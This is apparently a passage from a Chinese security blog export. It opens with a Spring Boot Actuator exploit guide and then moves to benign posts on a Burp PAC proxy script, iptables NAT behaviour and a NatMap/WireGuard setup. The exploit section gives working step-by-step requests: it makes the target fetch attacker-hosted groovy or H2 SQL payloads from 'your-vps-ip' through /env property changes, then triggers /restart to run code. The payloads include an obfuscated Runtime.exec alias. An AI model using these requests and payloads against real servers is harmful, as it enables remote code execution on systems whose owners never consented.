<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="步骤二：设置-logging-config-属性"><a href="#步骤二：设置-logging-config-属性" class="headerlink" title="步骤二：设置 logging.config 属性"></a>步骤二：设置 logging.config 属性</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">logging.config&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;logging.config&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>



<h5 id="步骤三：重启应用"><a href="#步骤三：重启应用" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="漏洞原理：-8"><a href="#漏洞原理：-8" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
<li>目标机器通过 logging.config 属性设置 logback 日志配置文件 URL 地址</li>
<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
<li><code>logback-classic</code> 组件的 <code>ch.qos.logback.classic.util.ContextInitializer.java</code> 代码文件逻辑中会判断 url 是否以 <code>groovy</code> 结尾</li>
<li>如果 url 以 <code>groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li>
</ol>
<h4 id="漏洞环境：-9"><a href="#漏洞环境：-9" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository/springboot-restart-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>



<h3 id="0x0B：restart-spring-main-sources-groovy-RCE"><a href="#0x0B：restart-spring-main-sources-groovy-RCE" class="headerlink" title="0x0B：restart spring.main.sources groovy RCE"></a>0x0B：restart spring.main.sources groovy RCE</h3><h4 id="利用条件：-14"><a href="#利用条件：-14" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 groovy 语法内容的文件，会导致程序异常退出</li>
<li>⚠️ 环境中需要存在 groovy 依赖，否则会导致程序异常退出</li>
</ul>
<h4 id="利用方法：-14"><a href="#利用方法：-14" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-groovy-文件-1"><a href="#步骤一：托管-groovy-文件-1" class="headerlink" title="步骤一：托管 groovy 文件"></a>步骤一：托管 groovy 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以 <code>groovy</code> 结尾的  <code>example.groovy</code> 文件，内容为需要执行的 groovy 代码，比如：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="步骤二：设置-spring-main-sources-属性"><a href="#步骤二：设置-spring-main-sources-属性" class="headerlink" title="步骤二：设置 spring.main.sources 属性"></a>步骤二：设置 spring.main.sources 属性</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.main.sources&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.main.sources&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.groovy&quot;&#125;</span><br></pre></td></tr></table></figure>



<h5 id="步骤三：重启应用-1"><a href="#步骤三：重启应用-1" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="漏洞原理：-9"><a href="#漏洞原理：-9" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
<li>目标机器可以通过 spring.main.sources 属性来设置创建 ApplicationContext 的额外源的 URL 地址</li>
<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
<li><code>spring-boot</code> 组件中的 <code>org.springframework.boot.BeanDefinitionLoader.java</code> 文件代码逻辑中会判断 url 是否以 <code>.groovy</code> 结尾</li>
<li>如果 url 以 <code>.groovy</code> 结尾，则最终会执行文件内容中的 groovy 代码，造成 RCE 漏洞</li>
</ol>
<h4 id="漏洞环境：-10"><a href="#漏洞环境：-10" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository/springboot-restart-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>



<h3 id="0x0C：restart-spring-datasource-data-h2-database-RCE"><a href="#0x0C：restart-spring-datasource-data-h2-database-RCE" class="headerlink" title="0x0C：restart spring.datasource.data h2 database RCE"></a>0x0C：restart spring.datasource.data h2 database RCE</h3><h4 id="利用条件：-15"><a href="#利用条件：-15" class="headerlink" title="利用条件："></a>利用条件：</h4><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
<li>环境中需要存在 <code>h2database</code>、<code>spring-boot-starter-data-jpa</code> 相关依赖</li>
<li>⚠️ 目标可以请求攻击者的 HTTP 服务器（请求可出外网），否则 restart 会导致程序异常退出</li>
<li>⚠️ HTTP 服务器如果返回含有畸形 h2 sql 语法内容的文件，会导致程序异常退出</li>
</ul>
<h4 id="利用方法：-15"><a href="#利用方法：-15" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：托管-sql-文件"><a href="#步骤一：托管-sql-文件" class="headerlink" title="步骤一：托管 sql 文件"></a>步骤一：托管 sql 文件</h5><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用 python 快速开启 http server</span></span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>在根目录放置以任意名字的文件，内容为需要执行的 h2 sql 代码，比如：</p>
<blockquote>
<p>⚠️ 下面payload 中的 ‘T5’ 方法只能 restart 执行一次；后面 restart 需要更换新的方法名称 (如 T6) 和设置新的 sql URL 地址，然后才能被 restart 重新使用，否则第二次 restart 重启应用时会导致程序异常退出</p>
</blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,&#x27;open -a Calculator&#x27;);</span><br></pre></td></tr></table></figure>



<h5 id="步骤二：设置-spring-datasource-data-属性"><a href="#步骤二：设置-spring-datasource-data-属性" class="headerlink" title="步骤二：设置 spring.datasource.data 属性"></a>步骤二：设置 spring.datasource.data 属性</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;env</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.data&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.sql</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;env</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.data&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.sql&quot;&#125;</span><br></pre></td></tr></table></figure>



<h5 id="步骤三：重启应用-2"><a href="#步骤三：重启应用-2" class="headerlink" title="步骤三：重启应用"></a>步骤三：重启应用</h5><p>spring 1.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;actuator&#x2F;restart</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="漏洞原理：-10"><a href="#漏洞原理：-10" class="headerlink" title="漏洞原理："></a>漏洞原理：</h4><ol>
<li>目标机器可以通过 spring.datasource.data 属性来设置 jdbc DML sql 文件的 URL 地址</li>
<li>restart 重启应用后，程序会请求设置的 URL 地址</li>
<li><code>spring-boot-autoconfigure</code> 组件中的 <code>org.springframework.boot.autoconfigure.jdbc.DataSourceInitializer.java</code> 文件代码逻辑中会使用 <code>runScripts</code> 方法执行请求 URL 内容中的 h2 database sql 代码，造成 RCE 漏洞</li>
</ol>
<h4 id="漏洞环境：-11"><a href="#漏洞环境：-11" class="headerlink" title="漏洞环境："></a>漏洞环境：</h4><p><a href="https://github.com/LandGrey/SpringBootVulExploit/tree/master/repository/springboot-restart-rce">repository/springboot-restart-rce</a></p>
<p>正常访问：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:9098&#x2F;actuator&#x2F;env</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>BurpSuite忽略心跳包的优雅解法</title>
    <url>/2024/02/01/BurpSuite%E5%BF%BD%E7%95%A5%E5%BF%83%E8%B7%B3%E5%8C%85%E7%9A%84%E4%BC%98%E9%9B%85%E8%A7%A3%E6%B3%95/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在渗透中，我们测试的站点可能会一直产生心跳包，比如展示大屏网站，严重影响了渗透工作，以往的方法都是通过BurpSuite的target scope来进行配置，但是个人不喜欢这么操作，因为容易忽略掉一些站外流量，近期想到了一种新方法来解决这个问题。</p>
<a id="more"></a>

<p><img data-src="/2024/02/01/BurpSuite%E5%BF%BD%E7%95%A5%E5%BF%83%E8%B7%B3%E5%8C%85%E7%9A%84%E4%BC%98%E9%9B%85%E8%A7%A3%E6%B3%95/2024-02-01-12-53-31.png"></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>前排提醒：Firefox下的SwitchyOmega不支持PAC配置，所以此方法不太适用。官方设置支持PAC但是用起来不优雅，推荐Chrome</strong></p>
<p>方法很简单，就是配置pac代理文件。<br>首先需要安装 SwitchyOmega，应该没有人不会安装吧。<br>创建一个新的情景模式，使用PAC模式<br><img data-src="/2024/02/01/BurpSuite%E5%BF%BD%E7%95%A5%E5%BF%83%E8%B7%B3%E5%8C%85%E7%9A%84%E4%BC%98%E9%9B%85%E8%A7%A3%E6%B3%95/2024-02-01-11-53-48.png"></p>
<p>贴上下面的脚本：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 三种匹配方式，任选一种即可，推荐使用 noProxyURI</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置不走代理的URL列表，需要结合glob通配符使用</span></span><br><span class="line"><span class="keyword">var</span> noProxyURLs = [</span><br><span class="line">    <span class="string">&quot;http://baidu.com/findQunQps*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://baidu.com/findContainerResource*&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置不走代理的URI列表，只要URL包含下面字符串就不会走代理</span></span><br><span class="line"><span class="keyword">var</span> noProxyURI = [</span><br><span class="line">    <span class="string">&quot;/abc/defg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/abc/report&quot;</span></span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 配置不走代理的host列表，url中包含下面字符串就不走代理</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> noProxyHosts = [</span><br><span class="line">    <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">    <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;firefox.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mozilla.net&quot;</span>,</span><br><span class="line">    <span class="string">&quot;firebaseio.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;mozilla.org&quot;</span>,</span><br><span class="line">    <span class="string">&quot;google.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.mozilla.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.googleapis.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;firefox.settings.services.mozilla.com&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> burp = <span class="string">&quot;PROXY 127.0.0.1:8080&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> direct = <span class="string">&#x27;DIRECT&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindProxyForURL</span>(<span class="params">url, host</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查当前URL是否在不走代理的列表中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; noProxyURLs.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (shExpMatch(url, noProxyURLs[i])) &#123;</span><br><span class="line">            <span class="comment">// 如果匹配到不走代理的URL，则返回 DIRECT</span></span><br><span class="line">            <span class="keyword">return</span> direct;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; noProxyURI.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.indexOf(noProxyURI[i]) !== -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果匹配到不走代理的URL，则返回 DIRECT</span></span><br><span class="line">            <span class="keyword">return</span> direct;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检查当前主机名是否在不走代理的列表中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; noProxyHosts.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dnsDomainIs(host, noProxyHosts[i])) &#123;</span><br><span class="line">            <span class="comment">// 如果匹配到不走代理的主机名，则返回 DIRECT</span></span><br><span class="line">            <span class="keyword">return</span> direct;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果不在不走代理的URL列表中，则走代理</span></span><br><span class="line">    <span class="keyword">return</span> burp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>如果需要增加url或者host只需要添加到数组里边即可。</p>
<p><img data-src="/2024/02/01/BurpSuite%E5%BF%BD%E7%95%A5%E5%BF%83%E8%B7%B3%E5%8C%85%E7%9A%84%E4%BC%98%E9%9B%85%E8%A7%A3%E6%B3%95/2024-02-01-11-56-54.png"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次有趣的iptables分析经历</title>
    <url>/2024/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84iptables%E5%88%86%E6%9E%90%E7%BB%8F%E5%8E%86/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>事情起因是一次修改家里VPN的路由方式，引发了一次关于iptables nat规则的思考。</p>
<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><p>网络环境如下图，笔记本电脑通过VPN访问远程内网设备。<br><img data-src="/2024/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84iptables%E5%88%86%E6%9E%90%E7%BB%8F%E5%8E%86/2024-03-06-11-37-59.png"><br>在VPN服务器中，通过一条NAT规则，将10段地址转为VPN服务器内网地址<code>192.168.200.10</code>以实现对内网设备的访问。VPN服务器与家里的内网设备不在同一个子网,两个子网间通过网关路由器进行转发，这样可以通过路由器做ACL规则以进行安全防护。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h3 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h3><p>某天因为有了需要家里内网终端访问远程的笔记本电脑的需求，即192.168.100.0/24段对10.0.0.0/24段主动发起连接的需求。显然，在之前的网络结构中，只能实现VPN客户端对家里内网的单向访问，并无法实现互访。</p>
<p>要实现双向访问也并不难，这点以前就实现过类似需求，只需要把VPN服务器的MASQUERADE NAT规则去除，然后在家里的网关路由增加一条下面的规则即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># VPN SERVER 删除NAT规则</span></span><br><span class="line">iptables -D POSTROUTING 1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 路由器设置规则</span></span><br><span class="line">route add -net 10.0.0.0/24 gw 192.168.100.10</span><br></pre></td></tr></table></figure>
<p>数据包流转如下：<br> <!-- ID  | 步骤 | IP SRC | IP DST | MAC SRC | MAC DST 
---|---|---|---|---|---
 1  | 内网客户端向VPN客户端发起请求，请求发向内网网关  | 192.168.100.20 | 10.0.0.10  | WORK | ROUTE GW 
 2  | 内网网关收到内网客户端请求，根据路由表把数据包转发到VPN服务器  | 192.168.100.20 | 10.0.0.10  | ROUTE GW | VPN SERVER 
 3  | VPN服务器收到数据包，把数据包通过VPN隧道转发到客户端  | 192.168.100.20 | 10.0.0.10  | VPN SERVER | LAPTOP 
 4  | VPN客户端收到请求数据包，发起响应，数据包原路返回  | 10.0.0.10 | 192.168.100.20  | LAPTOP | VPN SERVER  --></p>
<p><img data-src="/2024/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84iptables%E5%88%86%E6%9E%90%E7%BB%8F%E5%8E%86/2024-03-06-13-16-49.png"></p>
<p>经过上面的规则设置，内网设备与VPN客户端已经可以实现双方ip的直接互访。但是问题也随之出现，考虑到安全问题，我需要设置ACL规则限制VPN客户端的访问范围，原本的方式只需要对VPN服务器的ip地址做ACL限制就行了，现在还需要在VPN服务器规则的基础上加入VPN客户端网段的限制，需要考虑和改动的规则更多了，一一改动显然是不够优雅的，而且也可能导致安全隐患（绕过ACL访问到内网设备）。</p>
<p>所以就准备恢复原本的访问模式，在VPN服务器重新启动NAT。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A POSTROUTING -s 10.0.0.0/24 -o eth0 -j MASQUERADE</span><br></pre></td></tr></table></figure>

<p>但是我还没在网关上面删除10.0.0.0/24的静态路由，突发奇想试试内网客户端（DATA SERVER） ping 一下VPN客户端，发现是能ping通的！<br>而VPN客户端无法ping通内网客户端（DATA SERVER）。这好像误打误撞实现了我的需求，但是又不太对劲。</p>
<p>经过抓包分析，发现由内网客户端向VPN客户端发起请求时，VPN客户端的回应包不会被VPN服务器做NAT。</p>
<p>由此产生了本文的疑问，<strong>为什么明明符合了NAT规则，而iptables没有源地址为10.0.0.0/24的数据包作SNAT？</strong></p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>首先抓取VPN客户端（LAPTOP） ping 内网客户端（DATA SERVER）的数据包。</p>
<p>数据包流转如下（来自抓包分析）：</p>
<!-- | ID  | 步骤 | IP SRC | IP DST | MAC SRC | MAC DST |
| --- | --- | :---: | :---: | :---: | :---: |
| 1  | VPN客户端（LAPTOP）向DATA SERVER发起请求，数据包发向VPN服务器 | 10.0.0.10 |  192.168.100.30  | LAPTOP | VPN SERVER |
| 2  | VPN服务器匹配到符合SNAT规则的数据包，将源ip修改为VPN服务器的内网ip，即192.168.200.10，再根据路由表将数据包转发到网关路由器  |  192.168.200.10 |  192.168.100.30  | VPN SERVER  | ROUTE GW |
| 3  | 网关路由器根据ACL规则，禁止转发该数据包到目标网段，将数据包丢弃 | 192.168.200.10 |  192.168.100.30  | - | - | -->
<p><img data-src="/2024/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84iptables%E5%88%86%E6%9E%90%E7%BB%8F%E5%8E%86/2024-03-06-13-17-28.png"></p>
<p>所以VPN客户端无法ping通内网客户端（DATA SERVER），但是可以ping通内网客户端（WORK）。</p>
<p>再看下从内网客户端（DATA SERVER）ping VPN客户端（LAPTOP）的数据包：</p>
<!-- | ID  | 步骤 | IP SRC | IP DST | MAC SRC | MAC DST |
| --- | --- | :---: | :---: | :---: | :---: |
|1 | 内网客户端（DATA SERVER）向 VPN客户端（LAPTOP）发起icmp请求，数据包发送到网关路由器 | 192.168.100.30 | 10.0.0.10 | DATA SERVER | ROUTE GW |
|2 | 网关路由器根据路由表，将数据包转发到VPN服务器，因为ACL配置了允许规则，数据包可以进行转发 | 192.168.100.30 | 10.0.0.10 | ROUTE GW |  VPN SERVER  |
|3 | VPN服务器将数据包转发到VPN客户端 |  192.168.100.30 | 10.0.0.10 |VPN SERVER  |LAPTOP|
|4 | VPN客户端（LAPTOP）收到icmp请求，向内网客户端（DATA SERVER）发送icmp响应 | 10.0.0.10 | 192.168.100.30 | LAPTOP|VPN SERVER  |
|5 | VPN服务器收到数据包，没有经过NAT就把数据包发送到网关路由器 | 10.0.0.10 | 192.168.100.30 | VPN SERVER  |ROUTE GW |
|6 | 网关路由器收到数据包，根据路由表把数据包发送到内网客户端（DATA SERVER）|10.0.0.10 | 192.168.100.30 |ROUTE GW |DATA SERVER| -->
<p><img data-src="/2024/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84iptables%E5%88%86%E6%9E%90%E7%BB%8F%E5%8E%86/2024-03-06-13-18-05.png"><br>整个过程中奇怪的是从内网客户端（DATA SERVER）ping VPN客户端（LAPTOP）过程中，VPN客户端（LAPTOP）回应icmp请求时，VPN服务器收到数据包，是符合SNAT规则的，但是没有经过NAT就把数据包发送到网关路由器。</p>
<h3 id="破案"><a href="#破案" class="headerlink" title="破案"></a>破案</h3><p>根据上面的分析过程，可以推断，iptables在做SNAT的时候会先进行回话方向的判断的，即符合源ip规则发起的会话时会进行SNAT，若会话发起方不匹配源ip规则，则不会进行SNAT而是直接进行转发。</p>
<p><img data-src="/2024/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84iptables%E5%88%86%E6%9E%90%E7%BB%8F%E5%8E%86/2024-03-06-12-57-31.png"></p>
<p>那么为什么会有这样的机制了，直接搜索snat相关的机制都是说能做源地址转发让终端上网之类的，没能解答我的疑问。</p>
<p>最终经过Google搜索<code>iptables nat sessions</code>找到一个论坛的问答解决了我的疑问。<br><img data-src="/2024/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84iptables%E5%88%86%E6%9E%90%E7%BB%8F%E5%8E%86/2024-03-06-12-47-42.png"></p>
<p>题主正好提出了与我相同的疑问。<br><img data-src="/2024/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84iptables%E5%88%86%E6%9E%90%E7%BB%8F%E5%8E%86/2024-03-06-13-01-25.png"></p>
<p><img data-src="/2024/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84iptables%E5%88%86%E6%9E%90%E7%BB%8F%E5%8E%86/2024-03-06-13-07-06.png"><br><img data-src="/2024/03/06/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84iptables%E5%88%86%E6%9E%90%E7%BB%8F%E5%8E%86/2024-03-06-13-02-39.png"></p>
<p>原文：<a href="https://unix.stackexchange.com/questions/484868/in-iptables-does-masquerade-match-only-on-new-connections-syn-packets">https://unix.stackexchange.com/questions/484868/in-iptables-does-masquerade-match-only-on-new-connections-syn-packets</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>NatMap IPv4直连方案</title>
    <url>/2024/06/08/NatMap-IPv4%E7%9B%B4%E8%BF%9E%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>目前申请公网ip越来越难，虽然目前IPv6越来越普及，仍有部分场景不能覆盖到，如部分企业内网、公共WiFi等，如何高效远程接入家庭内网，本文将分享由 <code>NatMap+WireGuard</code>远程接入家庭内网的方案。</p>
<p>本方案的优势在于，不同于FRP的P2P连接需要依赖客户端的支持（如IOS无法使用），在没有公网IPv4下可以直接使用IPv4直连内网。本方案是笔者自认为的最优方案，不一定是读者的最优方案，建议阅读后自行选择。</p>
<a id="more"></a>
<p>本方案作为IPv6接入的补充，可以与IPv6同时使用，建议优先使用IPv6。</p>
<h3 id="环境要求"><a href="#环境要求" class="headerlink" title="环境要求"></a>环境要求</h3><ol>
<li>网络类型为NAT1</li>
<li>内网24小时运行的服务器，如openwrt、pve等</li>
<li>配置好的WireGuard服务</li>
<li>Server酱注册/PushDeer</li>
</ol>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="NAT1网络"><a href="#NAT1网络" class="headerlink" title="NAT1网络"></a>NAT1网络</h4><p>NAT1网络有很多好处，比如便于建立P2P连接，有利于BT、PT下载、FRP穿透等，家庭网络建议开启。至于其安全性，作为安全从业者，经过查阅资料，个人认为在没有公网IP的情况下是安全的，至于为什么长篇大论就不说了，可以自己研究。</p>
<p>怎么开启NAT1，这个没啥好说的，光猫桥接模式+路由器选择NAT1即可，这个根据自己的设备搜一搜就有很多文章。<br><img data-src="/2024/06/08/NatMap-IPv4%E7%9B%B4%E8%BF%9E%E6%96%B9%E6%A1%88/2024-06-08-22-38-33.png"></p>
<p>可以使用NatTypeTester测试自己的NAT类型。<br><a href="https://github.com/HMBSbige/NatTypeTester">https://github.com/HMBSbige/NatTypeTester</a></p>
